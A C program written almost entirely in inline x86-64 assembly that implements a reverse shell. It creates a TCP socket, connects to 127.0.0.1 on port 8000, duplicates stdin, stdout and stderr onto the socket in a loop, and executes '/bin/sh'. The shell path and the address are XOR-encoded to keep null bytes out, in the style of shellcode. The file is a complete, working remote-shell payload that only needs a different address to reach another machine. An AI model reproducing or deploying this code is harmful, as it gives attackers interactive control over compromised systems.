#include <stdio.h>

int main(){ 
//Calling socket for FD
  // family - AF_INET (2)
  asm("xor %rdi, %rdi");
  asm("add $2, %rdi");

  // second argument in %rsi: type - SOCK_STREAM (1)
  asm("xor %rsi, %rsi");
  asm("add $1, %rsi");
  
  // third argument in %rdx: protocol = 0
  asm("xor %rdx, %rdx");

  // syscall: socket() = 41
  asm("xor %rax, %rax");
  asm("mov $41, %ax");
  asm("push %ax");

  asm("syscall");
//Done - %rax holds the socket FD

//Calling connect
  // serv_addr.sin_addr.s_addr  -- 127.0.0.1
  asm("xor %rbx, %rbx");
  asm("mov $0x11111111, %rbx");
  asm("xor $0x1011116e, %rbx");
  asm("push %rbx");

  // serv_addr.sin_port = htons(8000): 0x401f
  asm("mov $0x401f, %bx");      // %bx: last 2bytes of %rbx
  asm("push %bx");

  // serv_addr.sin_family = AF_INET (2)
  asm("xor %rbx, %rbx");
  asm("add $2, %bx");
  asm("push %bx");

  //serv_addr is all on the stack - 
  // &serv_addr
  asm("mov %rsp, %rsi");
  // arg2 is ready

  // sockfd is still stored in rax - 
  asm("mov %rax, %rdi");
  // arg1 is ready

  // arg3 len(serv_addr) = 16 
  asm("xor %rdx, %rdx");
  asm("add $16, %rdx");
  //ready

  // syscall: connect() = 42
  asm("xor %rax, %rax");
  asm("mov $42, %ax");
  asm("syscall");

//Working with dup2 - to mirror 3 descriptors
                         //dup() arg1 (our network descriptor) - is still chillin' in %rdi
  asm("xor %rsi, %rsi"); //dup() arg2 starts at 0
  asm("xor %rbx, %rbx"); //counter


  //Shenanigans (loop)
  asm("call next");
  asm("next:");      //We'll be back
  asm("pop %rbx");
  asm("push %rbx");

  //dup2()
  asm("xor %rax, %rax");
  asm("mov $33, %ax");

  asm("cmp $3, %rsi"); //Are we done yet?
  asm("je cya");
  //..no
  asm("syscall");
  asm("add $1, %rsi");
  asm("push %rbx");
  asm("ret");
  // asm("jmp %rbx");

  asm("cya:");      //l8r
  asm("pop %rax");
//Done descriptor mirroring

//Prepare to call shellz
  // first argument: rdi
  asm("movabsq $0x1111111111111111, %rax");
  asm("movabsq $0x1179623e7f78733e, %rbx");
  asm("xor %rbx, %rax");
  asm("push %rax");
  asm("mov %rsp, %rdi");

  // second argument: rsi
  asm("xor %rax, %rax");
  asm("push %rax");
  asm("push %rdi");
  asm("mov %rsp, %rsi");

  // third argumet: rdx
  asm("xor %rdx, %rdx");

  // execve(59)
  asm("mov  $59, %al");
  asm("syscall");

  return 0;
}

